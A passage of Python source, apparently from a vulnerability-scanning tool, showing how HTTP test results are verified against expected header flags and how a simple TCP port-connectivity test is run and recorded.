                if "Access-Control-Allow-Origin" not in missing_flags:
                    missing_flags.append("Access-Control-Allow-Origin")

        verified = len(missing_flags) == 0 and status_match and error is None

        # If error occurred but we still matched some flags, note it
        if error and matched_flags:
            verified = False

        return VulnTestResult(
            test_id=tc.id,
            name=tc.name,
            scenario_id=tc.scenario_id,
            scenario_name=tc.scenario_name,
            verified=verified,
            status_code=status if status > 0 else None,
            response_snippet=raw_body[:500] if raw_body else "",
            error=error,
            matched_flags=matched_flags,
            missing_flags=missing_flags,
            severity=tc.severity,
        )

    def _run_tcp_test(self, tc: VulnTestCase) -> VulnTestResult:
        """Run a TCP connectivity test."""
        parts = tc.path.split(":")
        host = parts[0]
        port = int(parts[1]) if len(parts) > 1 else 80

        is_open = _tcp_check(host, port, timeout=3)

        return VulnTestResult(
            test_id=tc.id,
            name=tc.name,
            scenario_id=tc.scenario_id,
            scenario_name=tc.scenario_name,
            verified=is_open,
            status_code=None,
            response_snippet=f"TCP {'OPEN' if is_open else 'CLOSED'}",
            error=None if is_open else f"TCP connection to {host}:{port} failed",
            matched_flags=["TCP_OPEN"] if is_open else [],
            missing_flags=[] if is_open else ["TCP_OPEN"],
            severity=tc.severity,
        )